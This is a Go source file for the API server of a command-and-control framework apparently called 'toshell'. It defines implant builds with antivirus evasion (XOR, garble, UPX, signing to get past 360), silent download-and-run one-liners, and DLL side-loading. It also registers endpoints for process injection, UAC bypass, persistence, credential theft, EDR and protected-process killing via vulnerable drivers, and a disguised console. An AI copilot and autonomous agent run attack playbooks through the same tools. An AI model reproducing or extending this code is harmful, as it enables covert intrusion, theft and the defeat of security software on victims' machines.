package api

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/mux"
	"toshell/internal/common/tunnel"
	"toshell/internal/common/types"
	"toshell/internal/server/agentstore"
	"toshell/internal/server/ai"
	"toshell/internal/server/auth"
	"toshell/internal/server/builder"
	"toshell/internal/server/config"
	"toshell/internal/server/drivers"
	"toshell/internal/server/logging"
	"toshell/internal/server/mcp"
	"toshell/internal/server/modules"
	"toshell/internal/server/session"
	"toshell/internal/server/task"
)

// ─── Core Types ────────────────────────────────────────────────────────────────

type LoginRequest struct {
	Username string `json:"username"`
	Password string `json:"password"`
}

type BuildRequest struct {
	ID           string `json:"id"`
	Name         string `json:"name"`
	Format       string `json:"format"`
	Language     string `json:"language"` // go(默认) / c（C 植入端，体积极小，仅 Windows）
	ListenerID   string `json:"listener_id"`
	ServerURL    string `json:"server_url"`
	Protocol     string `json:"protocol"`
	Interval     uint32 `json:"interval"`
	Jitter       uint32 `json:"jitter"`
	RetryCount   uint32 `json:"retry_count"`
	RetryWait    uint32 `json:"retry_wait"`
	KillDate     string `json:"kill_date"`
	WorkingHours string `json:"working_hours"`
	RelayListen  string `json:"relay_listen"`
	FrontDomain  string `json:"front_domain"`
	Profile      string `json:"profile"` // full(默认) / light(精简减体积)
	OutputPath   string `json:"output_path"`
	OS           string `json:"os"`
	Arch         string `json:"arch"`
	// DownloadHost 一键上线命令里的载荷下载地址（可选）：留空时服务端按
	// 监听器 public_host → 控制台访问地址 → server_url 主机 → 本机内网 IP 逐级解析。
	// 填 https://c2.example.com 这类完整地址可覆盖自动解析（CDN/反代场景）。
	DownloadHost string `json:"download_host"`
	// Evasion options
	XOREncrypt   bool `json:"xor_encrypt"`
	XORKeySize   int  `json:"xor_key_size"`
	GarbleEnable bool `json:"garble_enabled"`
	UPXEnable    bool `json:"upx_enabled"`
	// EvasionScan 主动反沙箱进程检测（默认关闭）：枚举进程并与安全软件/分析工具
	// 进程名比对后延迟执行。该行为会被国产杀软主动防御拦（见植入端
	// gate_scan_windows.go），且需要静态 API 导入与进程名字符串，故默认不编译。
	EvasionScan bool `json:"evasion_scan"`
	// BofEnabled BOF（Cobalt Strike Beacon Object File）支持：默认关闭。
	// 开启会让载荷带上整套 Beacon* API 名字（22 处 pclntab 明文），只在需要跑 BOF 时开。
	BofEnabled bool `json:"bof_enabled"`
	// ExecModule 内存模块按需加载（v1.4.0 S4）：默认关闭（-tags execmodule）。
	// 开启后该载荷可以接收 POST /api/v1/sessions/{id}/module 下发的模块，
	// 在内存里反射加载执行 —— 一份最小载荷按需获得全功能，模块更新不必重编载荷。
	ExecModule bool `json:"exec_module"`
	// SignEnabled 构建后代码签名：证书在服务端配置（builder.sign_*），请求只能开启。
	// 未签名的新 PE 在装有 360/电脑管家的主机上会被拒绝执行，签名是"能不能跑起来"的敲门砖。
	SignEnabled bool `json:"sign_enabled"`
	// DLLExport / DLLAutoStart 仅 format=dll 生效：导出函数名（rundll32 payload.dll,<名字>，
	// 留空=Start）与"加载即启动"（白加黑场景宿主不一定调用我们的导出函数，默认 true）。
	DLLExport    string `json:"dll_export"`
	DLLAutoStart *bool  `json:"dll_autostart"`
	// 启动随机延迟（秒）：留空(0)时用服务端配置 implant.startup_delay_min/max，
	// 再回退 2~10s。显式传值可覆盖（如 20/60 拉长"启动即行为"的时间窗）。
	StartupDelayMin int `json:"startup_delay_min"`
	StartupDelayMax int `json:"startup_delay_max"`
}

type BuildResponse struct {
	ID          string `json:"id"`
	Name        string `json:"name"`
	Format      string `json:"format"`
	Size        int    `json:"size"`
	SHA256      string `json:"sha256"`
	BuildTime   string `json:"build_time"`
	DownloadURL string `json:"download_url"`
	// OneLiner 一条命令上线：直接复制到目标机执行即可静默下载并运行载荷（仅 exe/raw 生效）
	OneLiner string `json:"one_liner"`
	// OneLinerHost 实际解析出的载荷下载主机（host[:port]），供 UI 明确展示
	OneLinerHost string `json:"one_liner_host,omitempty"`
	// OneLinerBase 一键上线命令使用的下载基址（如 https://c2.example.com）
	OneLinerBase string `json:"one_liner_base,omitempty"`
	// OneLinerWarning 非空表示下载地址可能对目标机不可达（回环/仅内网）
	OneLinerWarning string `json:"one_liner_warning,omitempty"`
	// OneLiners 多条免杀上线命令变体（PowerShell/BITS/LOLBin/curl/python...），
	// 便于现场按终端拦截情况换用；OneLiner 为其首选项的兼容字段。
	OneLiners []OneLiner `json:"one_liners,omitempty"`
	// ── 代码签名结果（未启用签名时为零值）──
	// Signed 产物是否带有效 Authenticode 签名；Signer 签名者主题；SignStatus 复核状态
	// （Valid/NotSigned/UnknownError…）；SignMessage 中文说明（失败/跳过原因）。
	Signed      bool   `json:"signed"`
	Signer      string `json:"signer,omitempty"`
	SignMethod  string `json:"sign_method,omitempty"`
	SignStatus  string `json:"sign_status,omitempty"`
	SignMessage string `json:"sign_message,omitempty"`
	// ── 落地链建议（按平台/格式 + 是否已签名给出"该走哪条链"）──
	LoaderAdviceTitle string   `json:"loader_advice_title,omitempty"`
	LoaderAdviceTips  []string `json:"loader_advice_tips,omitempty"`
}

type ImplantsInfo struct {
	Name    string `json:"name"`
	Size    int64  `json:"size"`
	ModTime string `json:"mod_time"`
	Format  string `json:"format"`
}

type TaskPusher interface {
	PushTask(sessionID string, taskInfo *types.TaskInfo) error
	PushFileUpload(sessionID, uploadID, filename, targetPath string, size int64, taskID uint64) error
	SendTunnelPacket(sessionID string, tunnelPacket *tunnel.TunnelPacket) error
	SendTunnelRaw(sessionID string, rawPacket []byte) error
	ListRelayNodes() []types.RelayNode
	// PushModuleBlob 下发内存模块二进制（v1.4.0 S4）：
	// payload = moduleabi.EncodeBlobFrame 的产物（[4B 头长][头 JSON][裸字节]），
	// 各传输把它作为一帧 TypeModuleData 发出去（TCP/WS 直接下发；HTTP 入下行队列，
	// 植入端下次心跳取走；MQTT 发布到会话主题）。token 只用于日志关联。
	PushModuleBlob(sessionID, token string, payload []byte) error
}

type Server struct {
	router        *mux.Router
	httpServer    *http.Server
	sessionMgr    *session.Manager
	taskMgr       *task.Manager
	auth          *auth.Auth
	builder       *builder.Builder
	cfg           *config.Config
	listener      TaskPusher
	startTime     time.Time
	tunnelMgr     *tunnel.TunnelManager
	socks5Servers map[string]*tunnel.SOCKS5Server
	socks5Mu      sync.RWMutex
	wsHub         *WSHub
	webFS         http.FileSystem    // 嵌入式前端文件系统（nil = 未嵌入）
	copilot       *ai.Copilot        // AI 副驾驶（LLM 聊天 + 工具调用；nil = 未配置）
	playbookR     *ai.PlaybookRunner // 剧本化执行引擎（确定性攻击链）
	agentMgr      *ai.AgentManager   // 异步自主 Agent 运行时（run 生命周期 + 并发上限）
	// onConfigApplied 配置保存并热应用后的回调（由服务器主循环注册，
	// 用于通知各组件如 HTTP listener 拟态模板切换）。
	onConfigApplied func(cfg *config.Config)

	// 会话上下线广播去抖状态（见 session_broadcast.go，P0-1）
	broadcastState *sessionBroadcastState
	broadcastOnce  sync.Once

	// 屏幕流帧限速/合并状态（见 screen_frame_limiter.go，P0.2）
	screenLimiter     *screenFrameLimiter
	screenLimiterOnce sync.Once

	// 本会话已加载的 BYOVD 驱动档案（服务端不再内置驱动，见 handlers_edr.go）
	driverMu       sync.Mutex
	sessionDrivers map[string]drivers.Driver

	// agentResults 内置 Agent 的工具结果外置存储（v1.4.0 S2）。
	//
	// 它只依赖本地目录 + TTL，**与 mcp.enabled（对外 MCP 监听器）无关**：默认配置下
	// mcp.enabled=false，但内置 Agent 同样会产生截图/systeminfo 这类超长结果，必须在
	// 上下文里换成"摘要 + 句柄"而不是被字符串硬截断。nil = 目录不可用（退化为显式截断）。
	agentResults *mcp.ResultStore

	// taskWait 任务终结通知源（v1.4.0 S2）：默认就是 taskMgr。
	//
	// 单独留一个字段而不是直接用 taskMgr，是为了让"等任务终结 / 长任务挂起 / 重启恢复"
	// 这套编排能被单测覆盖——测试注入一个假的任务源即可，不需要真实植入端与真实任务表。
	taskWait agentTaskSource

	// agentStore Agent 长任务状态的持久化层（agent_runs/agent_steps/agent_tool_calls）。
	// nil = 无数据库（长任务仍能挂起/恢复，只是不具备跨重启恢复与幂等保证）。
	agentStore *agentstore.Store

	// resumeRun 恢复一个挂起 run 的执行入口（默认 = resumeAgentAsync）。
	// 同样是为可测性留的缝：恢复编排只负责"分类 + 落库 + 订阅"，执行交给它。
	resumeRun func(*ai.AgentRun)

	// agentTasks 长任务挂起/恢复桥（内部任务完成 → 唤醒对应 run）。
	agentTasks *agentTaskBridge

	// moduleStore 内存模块注册表 + 一次性 token（v1.4.0 S4）。
	// nil = 未初始化（首次用到时按 data/modules 懒初始化）；测试可直接注入临时目录。
	moduleStore *modules.Store
	// moduleAuditHook 模块审计事件的旁路接收器（nil = 只写日志）。
	// 做成 hook 是为了让"审计真的写了、字段对不对"能被单测断言，而不是去匹配日志文本。
	moduleAuditHook func(moduleAuditEvent)
}

// SetOnConfigApplied 注册配置热应用回调（设置 API 保存后触发）。
func (s *Server) SetOnConfigApplied(cb func(cfg *config.Config)) {
	s.onConfigApplied = cb
}

// ─── Lifecycle ─────────────────────────────────────────────────────────────────

func New(cfg *config.Config, sessMgr *session.Manager, taskMgr *task.Manager) *Server {
	b := builder.New()
	server := &Server{
		router:        mux.NewRouter(),
		sessionMgr:    sessMgr,
		taskMgr:       taskMgr,
		auth:          auth.New(&cfg.Auth),
		builder:       b,
		cfg:           cfg,
		startTime:     time.Now(),
		listener:      newListenerRouter(sessMgr),
		tunnelMgr:     tunnel.NewTunnelManager(),
		socks5Servers: make(map[string]*tunnel.SOCKS5Server),
		wsHub:         NewWSHub(),
	}
	// AI 副驾驶：executor 为 Server 自身（复用 MCP 工具实现）
	server.copilot = ai.New(cfg.AI, server)
	// 工具结果外置（v1.4.0 S2）：超长结果落盘为句柄 + 显式截断说明，配合 result_read 回读。
	// 放在 ai.New 之后注入（New 的签名保持不变），并在热更新重建 Copilot 时重复注入。
	server.agentResults = newAgentResultStore(cfg)
	server.applyResultStore(server.copilot)
	server.startResultGC()
	// 异步自主 Agent 运行时：并发上限由 config.AI.AgentConcurrency 决定（默认 2）
	server.agentMgr = ai.NewAgentManager(cfg.AI.AgentConcurrency)
	// 任务终结通知源（等待/挂起/恢复共用；测试可替换）
	server.taskWait = taskMgr
	// 长任务挂起/恢复桥（v1.4.0 S2）：把"内部任务完成通知"接到"恢复对应 run"上
	server.agentTasks = newAgentTaskBridge(server)
	// 恢复 run 的默认执行入口（与审批恢复同一条路径）
	server.resumeRun = server.resumeAgentAsync
	// 把长任务通道注入 Copilot：循环里遇到"预估耗时 ≥ 阈值"的工具即改为
	// 「提交 → 挂起 → 释放并发槽位」，由任务完成事件驱动恢复。
	server.applyLongTaskExecutor(server.copilot)
	// 剧本化执行引擎：executor 同样复用 Server 的 invokeTool（MCP 工具面）
	server.playbookR = ai.NewPlaybookRunner(server)
	// 剧本完成后自动生成 AI 总结建议（复用副驾驶 LLM，未配置则跳过）
	server.playbookR.SetAnalyzer(server.analyzePlaybook)
	// 任务流/模板合并到剧本：按 id 动态解析模板为剧本
	server.playbookR.SetPlaybookResolver(server.resolveTemplatePlaybook)
	// 首次启动把内置剧本 seed 成可编辑/删除的任务模板（初始示例），
	// 使副驾驶与任务模板页都以数据库模板为主
	server.seedBuiltinTemplates()

	go server.wsHub.Run()

	server.setupRoutes()
	return server
}

// SetListener 设置默认监听器（配置文件启动的监听器，main.go 调用）。
// 所有按会话路由的推送在未命中运行时监听器时回退到该默认监听器。
func (s *Server) SetListener(l TaskPusher) {
	if r, ok := s.listener.(*listenerRouter); ok {
		r.SetDefault(l)
	} else {
		s.listener = l
	}
}

// RegisterRuntimeListener 注册一个已启动的监听器实例（main.go 的默认监听器
// 或 API 动态创建的），使其可被 Web 界面停止/删除，并参与会话推送路由。
func (s *Server) RegisterRuntimeListener(id string, p TaskPusher, stop func()) {
	if r, ok := s.listener.(*listenerRouter); ok {
		r.register(&runtimeListener{id: id, pusher: p, stop: stop})
	}
}

// UnregisterRuntimeListener 注销并停止一个运行时监听器实例（返回是否命中）。
func (s *Server) UnregisterRuntimeListener(id string) bool {
	r, ok := s.listener.(*listenerRouter)
	if !ok {
		return false
	}
	r.mu.Lock()
	_, exists := r.runtimes[id]
	r.mu.Unlock()
	r.unregister(id)
	return exists
}

// StopSOCKS5ForSession 停止指定 session 的 SOCKS5 代理服务器（session 断连时调用）
func (s *Server) StopSOCKS5ForSession(sessionID string) {
	s.socks5Mu.Lock()
	defer s.socks5Mu.Unlock()

	if socks5, exists := s.socks5Servers[sessionID]; exists {
		fmt.Printf("[INFO] [api] Session %s disconnected, stopping SOCKS5 proxy on port %d\n", sessionID, socks5.GetPort())
		socks5.Stop()
		delete(s.socks5Servers, sessionID)
	}
}

// SetWebFS 设置嵌入的前端文件系统（服务端二进制嵌入前端时使用）
func (s *Server) SetWebFS(fs http.FileSystem) {
	s.webFS = fs
}

// BroadcastTaskEvent sends a task result event to all WebSocket frontend clients.
func (s *Server) BroadcastTaskEvent(eventType string, taskID uint64, sessionID string, taskType string, exitCode int32, output string, errorMsg string) {
	if s.wsHub == nil {
		return
	}
	payload := map[string]interface{}{
		"task_id":    taskID,
		"session_id": sessionID,
		"task_type":  taskType,
		"exit_code":  exitCode,
	}
	if output != "" {
		payload["output"] = output
	}
	if errorMsg != "" {
		payload["error"] = errorMsg
	}
	s.wsHub.Broadcast(WSEvent{
		Type:    eventType,
		Payload: payload,
	})
}

// sessionOnlinePayload 从 SessionInfo 构建前端可用的上线事件负载。
func sessionOnlinePayload(info *types.SessionInfo) map[string]interface{} {
	status := "active"
	if info.Status != "" {
		status = info.Status
	}
	lastSeen := ""
	if !info.LastSeen.IsZero() {
		lastSeen = info.LastSeen.Format(time.RFC3339Nano)
	}
	return map[string]interface{}{
		"id":          info.ID,
		"hostname":    info.Hostname,
		"username":    info.Username,
		"os":          info.OS,
		"arch":        info.Arch,
		"pid":         info.PID,
		"status":      status,
		"listener":    info.Listener,
		"remote_addr": info.RemoteAddr,
		"last_seen":   lastSeen,
	}
}

// 会话上下线广播（含去抖）见 session_broadcast.go：
// BroadcastSessionOnline / BroadcastSessionOffline / ForgetSessionBroadcast。

// BroadcastScreenFrame broadcasts a real-time screen stream frame to all WebSocket clients.
// payload 是植入端截图 JSON（{image, format, width, height}），附加 session_id 后透传。
// 超过会话期望帧率的帧在此丢弃（帧合并），避免 WS/前端被超发帧拖垮（P0.2）。
func (s *Server) BroadcastScreenFrame(sessionID string, payload []byte) {
	if s.wsHub == nil {
		return
	}
	if !s.frameLimiter().Allow(sessionID) {
		return
	}
	var frame map[string]interface{}
	if err := json.Unmarshal(payload, &frame); err != nil {
		return
	}
	frame["session_id"] = sessionID
	s.wsHub.Broadcast(WSEvent{
		Type:    "screen_frame",
		Payload: frame,
	})
}

func (s *Server) Start(addr string) error {
	// 应用配置的超时（此前 http.Server 无任何超时 → slowloris 可拖垮管理 API）
	readTimeout := s.cfg.Server.ReadTimeout
	if readTimeout <= 0 {
		readTimeout = 30 * time.Second
	}
	writeTimeout := s.cfg.Server.WriteTimeout
	if writeTimeout <= 0 {
		writeTimeout = 30 * time.Second
	}
	idleTimeout := s.cfg.Server.IdleTimeout
	if idleTimeout <= 0 {
		idleTimeout = 120 * time.Second
	}
	s.httpServer = &http.Server{
		Addr:         addr,
		Handler:      recoverMiddleware(s.router),
		ReadTimeout:  readTimeout,
		WriteTimeout: writeTimeout,
		IdleTimeout:  idleTimeout,
	}
	return s.httpServer.ListenAndServe()
}

// recoverMiddleware 全局 panic 兜底：任何 handler panic 只返回 500，
// 绝不杀死整个进程（此前 handlers_implant.go 的 body[:8] 可直接远程打崩服务）。
func recoverMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		defer func() {
			if rec := recover(); rec != nil {
				logging.Error("api", "panic recovered: %v (path=%s)", rec, r.URL.Path)
				http.Error(w, `{"error":"internal server error"}`, http.StatusInternalServerError)
			}
		}()
		next.ServeHTTP(w, r)
	})
}

func (s *Server) Stop() error {
	if s.httpServer != nil {
		return s.httpServer.Close()
	}
	return nil
}

// ─── Routes ────────────────────────────────────────────────────────────────────

func (s *Server) setupRoutes() {
	// health 也纳入 Web 防护：避免未认证探测拿到 200 响应形成指纹
	// （运维监控请携带 X-API-Key 或 Basic 凭据）
	s.router.Handle("/api/v1/health", s.webGate(http.HandlerFunc(s.healthHandler))).Methods("GET")

	implant := s.router.PathPrefix("/api/v1/implant").Subrouter()
	implant.HandleFunc("/register", s.implantRegisterHandler).Methods("POST")
	implant.HandleFunc("/heartbeat", s.implantHeartbeatHandler).Methods("POST")
	implant.HandleFunc("/result", s.implantResultHandler).Methods("POST")
	// 免认证载荷下载端点：供"一条命令上线"在目标机上直接拉取 exe（无 token 可用）。
	implant.HandleFunc("/payload/{id}", s.downloadStoredImplantHandler).Methods("GET")
	// 免认证一次性 UAC 提权载荷（fodhelper 拉起的高完整性进程无 token）。
	implant.HandleFunc("/uac/{token}", s.uacPayloadHandler).Methods("GET")

	api := s.router.PathPrefix("/api/v1").Subrouter()

	// Web 防护（防测绘）先于认证：未带任何凭据的探测请求直接 404/401，
	// 不会进入后续逻辑；持有 API Key/JWT 的自动化客户端照常放行。
	api.Use(s.webGate)

	if s.auth != nil {
		api.Use(s.auth.Middleware())
	}

	api.HandleFunc("/login", s.loginHandler).Methods("POST")

	api.HandleFunc("/sessions", s.listSessionsHandler).Methods("GET")
	api.HandleFunc("/sessions/{id}", s.getSessionHandler).Methods("GET")
	api.HandleFunc("/sessions/{id}", s.updateSessionHandler).Methods("PATCH")
	api.HandleFunc("/sessions/{id}", s.deleteSessionHandler).Methods("DELETE")
	api.HandleFunc("/sessions/{id}/capabilities", s.sessionCapabilitiesHandler).Methods("GET")
	// 内存模块按需加载（v1.4.0 S4）：POST 下发执行，GET 列出可用模块与可用性判定。
	api.HandleFunc("/sessions/{id}/module", s.execModuleHandler).Methods("POST")
	api.HandleFunc("/sessions/{id}/module", s.listSessionModulesHandler).Methods("GET")
	api.HandleFunc("/sessions/{id}/interact", s.interactSessionHandler).Methods("POST")
	api.HandleFunc("/sessions/{id}/files", s.listFilesHandler).Methods("GET", "POST")
	api.HandleFunc("/sessions/{id}/files/download", s.downloadFileHandler).Methods("POST")
	api.HandleFunc("/sessions/{id}/files/upload", s.uploadFileHandler).Methods("POST")
	api.HandleFunc("/sessions/{id}/files/delete", s.deleteFileHandler).Methods("POST")
	api.HandleFunc("/files/transfer", s.transferFileHandler).Methods("GET")
	api.HandleFunc("/sessions/{id}/processes", s.listProcessesHandler).Methods("GET")
	api.HandleFunc("/sessions/{id}/processes/{pid}", s.killProcessHandler).Methods("DELETE")
	api.HandleFunc("/sessions/{id}/inject", s.processInjectHandler).Methods("POST")
	api.HandleFunc("/sessions/{id}/bof", s.loadBofHandler).Methods("POST")
	api.HandleFunc("/sessions/{id}/shell", s.shellWebSocketHandler).Methods("GET")

	api.HandleFunc("/tasks", s.listTasksHandler).Methods("GET")
	api.HandleFunc("/tasks/stats", s.taskStatsHandler).Methods("GET")
	api.HandleFunc("/tasks", s.createTaskHandler).Methods("POST")
	api.HandleFunc("/tasks/{id}", s.getTaskHandler).Methods("GET")
	api.HandleFunc("/tasks/{id}", s.deleteTaskHandler).Methods("DELETE")
	api.HandleFunc("/tasks/{id}/cancel", s.cancelTaskHandler).Methods("POST")
	// AI 副驾驶 MCP 工具端点
	api.HandleFunc("/mcp/tools", s.mcpToolsHandler).Methods("GET")
	api.HandleFunc("/mcp/tools/{name}", s.mcpToolInvokeHandler).Methods("POST")
	api.HandleFunc("/intel", s.listIntelHandler).Methods("GET")
	// AI 副驾驶聊天端点
	api.HandleFunc("/copilot/status", s.copilotStatusHandler).Methods("GET")
	api.HandleFunc("/copilot/chat", s.copilotChatHandler).Methods("POST")
	api.HandleFunc("/copilot/consent", s.copilotConsentHandler).Methods("POST")
	// 异步自主 Agent 端点（非阻塞：创建即返回 run_id，事件走 SSE）
	api.HandleFunc("/agent/chat", s.agentChatHandler).Methods("POST")
	api.HandleFunc("/agent/runs/{id}", s.agentRunHandler).Methods("GET")
	api.HandleFunc("/agent/runs/{id}/events", s.agentEventsHandler).Methods("GET")
	api.HandleFunc("/agent/runs/{id}/cancel", s.agentCancelHandler).Methods("POST")
	api.HandleFunc("/agent/runs/{id}/consent", s.agentConsentHandler).Methods("POST")
	// 副驾驶剧本化端点
	api.HandleFunc("/copilot/playbooks", s.listPlaybooksHandler).Methods("GET")
	api.HandleFunc("/copilot/playbook/run", s.runPlaybookHandler).Methods("POST")
	api.HandleFunc("/copilot/playbook/runs", s.listPlaybookRunsHandler).Methods("GET")
	api.HandleFunc("/copilot/playbook/runs/{id}", s.getPlaybookRunHandler).Methods("GET")

	// 通道健康仪表板
	api.HandleFunc("/channels/health", s.channelsHealthHandler).Methods("GET")

	api.HandleFunc("/builders", s.listBuildersHandler).Methods("GET")
	api.HandleFunc("/builders", s.createBuilderHandler).Methods("POST")
	api.HandleFunc("/builders/download", s.downloadPayloadHandler).Methods("POST")
	api.HandleFunc("/implants", s.listImplantsHandler).Methods("GET")
	api.HandleFunc("/implants/download/{name}", s.downloadImplantHandler).Methods("GET")
	api.HandleFunc("/implants/stored", s.listStoredImplantsHandler).Methods("GET")
	api.HandleFunc("/implants/stored/{id}/oneliner", s.storedImplantOneLinerHandler).Methods("GET")
	api.HandleFunc("/implants/stored/{id}", s.downloadStoredImplantHandler).Methods("GET")
	api.HandleFunc("/implants/{id}", s.deleteStoredImplantHandler).Methods("DELETE")

	api.HandleFunc("/logs", s.listLogsHandler).Methods("GET")
	api.HandleFunc("/system/stats", s.systemStatsHandler).Methods("GET")

	api.HandleFunc("/ws/events", s.wsHub.ServeWS).Methods("GET")

	api.HandleFunc("/tunnels", s.listTunnelsHandler).Methods("GET")
	api.HandleFunc("/tunnels", s.createTunnelHandler).Methods("POST")
	api.HandleFunc("/tunnels/{id}", s.closeTunnelHandler).Methods("DELETE")

	api.HandleFunc("/plugins", s.listPluginsHandler).Methods("GET")
	api.HandleFunc("/plugins", s.uploadPluginHandler).Methods("POST")
	api.HandleFunc("/plugins/{id}", s.getPluginHandler).Methods("GET")
	api.HandleFunc("/plugins/{id}", s.deletePluginHandler).Methods("DELETE")
	api.HandleFunc("/plugins/refresh", s.refreshPluginsHandler).Methods("POST")
	api.HandleFunc("/sessions/{id}/plugin", s.loadPluginHandler).Methods("POST")

	api.HandleFunc("/injection/methods", s.listInjectionMethodsHandler).Methods("GET")
	api.HandleFunc("/sessions/{id}/injection", s.executeInjectionHandler).Methods("POST")
	api.HandleFunc("/sessions/{id}/auto-inject", s.autoInjectHandler).Methods("POST")
	api.HandleFunc("/sessions/{id}/spawn", s.spawnHandler).Methods("POST")
	api.HandleFunc("/sessions/{id}/fileless-exec", s.filelessExecHandler).Methods("POST")
	api.HandleFunc("/sessions/{id}/privesc-uac", s.privescUACHandler).Methods("POST")

	api.HandleFunc("/sessions/{id}/persistence", s.listPersistenceHandler).Methods("GET")
	api.HandleFunc("/sessions/{id}/persistence/install", s.installPersistenceHandler).Methods("POST")
	api.HandleFunc("/sessions/{id}/persistence/remove", s.removePersistenceHandler).Methods("POST")

	api.HandleFunc("/sessions/{id}/credentials", s.credentialsHandler).Methods("POST")

	api.HandleFunc("/sessions/{id}/screenshot", s.takeScreenshotHandler).Methods("POST")
	api.HandleFunc("/sessions/{id}/screen-stream", s.screenStreamHandler).Methods("POST")
	api.HandleFunc("/sessions/{id}/relay", s.relayControlHandler).Methods("POST")
	api.HandleFunc("/relay-nodes", s.listRelayNodesHandler).Methods("GET")
	api.HandleFunc("/sessions/{id}/edr/blind", s.edrBlindHandler).Methods("POST")
	api.HandleFunc("/sessions/{id}/edr/kill", s.edrKillHandler).Methods("POST")
	api.HandleFunc("/sessions/{id}/edr/byovd-load", s.byovdLoadHandler).Methods("POST")
	api.HandleFunc("/sessions/{id}/edr/byovd-unload", s.byovdUnloadHandler).Methods("POST")
	api.HandleFunc("/sessions/{id}/edr/byovd-kill", s.byovdKillHandler).Methods("POST")
	api.HandleFunc("/sessions/{id}/edr/ppl-kill", s.pplKillHandler).Methods("POST")
	api.HandleFunc("/drivers", s.listDriversHandler).Methods("GET")
	// 驱动加载前自检（sha256 一致性 / Authenticode 签名者 / 易受攻击驱动黑名单提示）
	api.HandleFunc("/drivers/{name}/verify", s.verifyDriverHandler).Methods("GET")
	api.HandleFunc("/drivers/{name}/raw", s.downloadDriverHandler).Methods("GET")
	api.HandleFunc("/settings", s.getSettingsHandler).Methods("GET")
	api.HandleFunc("/settings", s.updateSettingsHandler).Methods("PUT")
	api.HandleFunc("/settings/webhook/test", s.testWebhookHandler).Methods("POST")

	api.HandleFunc("/listeners", s.listListenersHandler).Methods("GET")
	api.HandleFunc("/listeners", s.createListenerHandler).Methods("POST")
	api.HandleFunc("/listeners/{id}", s.getListenerHandler).Methods("GET")
	api.HandleFunc("/listeners/{id}", s.updateListenerHandler).Methods("PUT")
	api.HandleFunc("/listeners/{id}/start", s.startListenerHandler).Methods("POST")
	api.HandleFunc("/listeners/{id}/stop", s.stopListenerHandler).Methods("POST")
	api.HandleFunc("/listeners/{id}", s.deleteListenerHandler).Methods("DELETE")

	api.HandleFunc("/templates", s.listTemplatesHandler).Methods("GET")
	api.HandleFunc("/templates", s.createTemplateHandler).Methods("POST")
	api.HandleFunc("/templates/{id}", s.getTemplateHandler).Methods("GET")
	api.HandleFunc("/templates/{id}", s.updateTemplateHandler).Methods("PUT")
	api.HandleFunc("/templates/{id}", s.deleteTemplateHandler).Methods("DELETE")
	api.HandleFunc("/sessions/{id}/workflow", s.executeWorkflowHandler).Methods("POST")
	api.HandleFunc("/workflows/{id}", s.getWorkflowStatusHandler).Methods("GET")

	// robots.txt：避免被搜索引擎收录（测绘引擎不遵守，但成本为零）
	s.router.HandleFunc("/robots.txt", s.robotsHandler).Methods("GET")

	// 隐蔽入口（disguise 模式下浏览器进入控制台）：/__gate?k=<stealth_key>
	// 必须在 SPA 兜底之前注册；密钥错误时返回 404，不暴露入口存在。
	s.router.HandleFunc("/__gate", s.gateEntryHandler).Methods("GET")

	// SPA 前端 — 嵌入在二进制中，非 API 路径回退到 index.html。
	// 同样经过 Web 防护：未认证访问 / 与 /assets/* 只会得到 404/401，不返回任何前端内容
	// （否则测绘引擎可通过 index.html 标题与静态资源指纹收录本资产）。
	s.router.PathPrefix("/").Handler(s.webGate(s.serveSPA()))
}

// implantExemptPrefixes Web 防护豁免前缀：植入端协议与免认证载荷下载。
// 这些路径由植入端在不具备浏览器认证凭据的情况下访问，一旦被拦住会话会直接失联。
var implantExemptPrefixes = []string{
	"/api/v1/implant/",
}

// webConfig Web 防护配置：**每次请求读取**实时配置（config.Get()），
// 使设置页保存后立即生效（不能缓存 s.cfg —— 它是启动时的快照）。
func (s *Server) webConfig() auth.WebGateConfig {
	cfg := config.Get()
	if cfg == nil {
		cfg = s.cfg
	}
	if cfg == nil {
		return auth.WebGateConfig{}
	}
	return auth.WebGateConfig{
		Enabled:           cfg.Web.BasicAuthEnabled,
		User:              cfg.Web.BasicAuthUser,
		PasswordHash:      cfg.Web.BasicAuthPassword,
		Disguise:          strings.ToLower(strings.TrimSpace(cfg.Web.UnauthMode)) != "basic",
		AllowCIDRs:        cfg.Web.AllowCIDRs,
		TrustProxyHeaders: cfg.Server.TrustProxyHeaders,
		StealthKey:        cfg.Web.StealthKey,
		StealthCookie:     cfg.Web.StealthCookie,
		EntryChallenge:    cfg.Web.EntryChallenge,
	}
}

// gateEntryHandler 隐蔽入口：GET /__gate[?k=<stealth_key>]
//
// disguise 模式下服务端对 / 不返回 401 挑战（浏览器不会弹认证框），且浏览器不会把
// URL 中内嵌的 Basic 凭据带到 JS/CSS 子资源请求上，因此浏览器无法进入控制台。
// 本入口提供两种进入方式：
//  1. /__gate?k=<密钥>            —— 直接带密钥进入（适合书签，无需输入）
//  2. /__gate（浏览器弹认证框）    —— 该路径返回 401 挑战，输入控制台防护的
//     用户名/密码后种下入口 Cookie；只有这个路径给挑战，/ 与其他路径依旧 404 伪装。
//
// 成功后种下 HttpOnly 入口 Cookie，之后整个控制台（含静态资源与 API）凭 Cookie 通行。
func (s *Server) gateEntryHandler(w http.ResponseWriter, r *http.Request) {
	cfg := s.webConfig()
	if cfg.Disabled() {
		http.NotFound(w, r)
		return
	}

	// 方式 1：入口密钥
	if auth.StealthKeyMatches(cfg.StealthKey, r.URL.Query().Get("k")) {
		s.issueGateCookie(w, r, cfg)
		return
	}

	// 方式 2：Basic 凭据（浏览器弹框）
	if user, pass, ok := r.BasicAuth(); ok {
		if auth.ValidateGateBasic(cfg, user, pass) {
			s.issueGateCookie(w, r, cfg)
			return
		}
		// 凭据错误：保持在入口路径上的挑战，让浏览器重新提示（不泄露其他信息）
		w.Header().Set("WWW-Authenticate", `Basic realm="restricted"`)
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}

	// 未提供任何凭据：入口路径可给出 401 挑战（便于浏览器弹框）；
	// 关闭 entry_challenge 时与普通路径一致返回 404，不暴露入口存在。
	if cfg.EntryChallenge {
		w.Header().Set("WWW-Authenticate", `Basic realm="restricted"`)
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}
	http.NotFound(w, r)
}

// issueGateCookie 种下入口 Cookie 并跳转首页（去掉 URL 中的密钥，避免留在历史记录）。
func (s *Server) issueGateCookie(w http.ResponseWriter, r *http.Request, cfg auth.WebGateConfig) {
	http.SetCookie(w, &http.Cookie{
		Name:     cfg.GateCookieName(),
		Value:    auth.GateCookieValue(cfg.StealthKey),
		Path:     "/",
		HttpOnly: true,
